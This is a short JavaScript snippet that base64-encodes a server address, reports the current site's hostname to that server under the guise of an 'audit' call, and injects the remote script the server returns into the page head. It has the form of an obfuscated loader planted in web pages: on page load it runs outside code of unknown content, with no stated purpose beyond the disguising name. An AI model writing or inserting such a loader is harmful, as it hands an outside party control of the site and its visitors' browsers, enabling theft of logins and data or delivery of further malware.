(function() {
    const serverB64 = "aHR0cHM6Ly9hdWRpdGlmeS5jbGljay8=";
    const baseUrl = atob(serverB64);
    const currentDomain = window.location.hostname;

    const script = document.createElement('script');

    script.src = `${baseUrl}api/audit.php?sv=${currentDomain}&t=${Date.now()}`;

    script.async = true;

    script.onerror = function() {
        console.log("no script load from server.");
    };

    document.head.appendChild(script);
})();